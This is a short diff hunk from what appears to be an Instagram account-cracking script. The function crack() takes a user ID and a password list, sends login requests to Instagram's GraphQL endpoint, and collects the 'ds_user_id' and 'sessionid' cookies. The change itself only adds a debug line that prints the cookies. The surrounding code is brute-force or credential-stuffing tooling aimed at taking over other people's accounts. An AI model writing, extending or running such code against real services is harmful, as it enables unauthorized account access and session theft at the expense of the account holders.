@@ -225,6 +225,7 @@ def crack(uid, password_list, total_count):
     'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
 }
             # Make API request
+            print(cookies)
             response = session.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
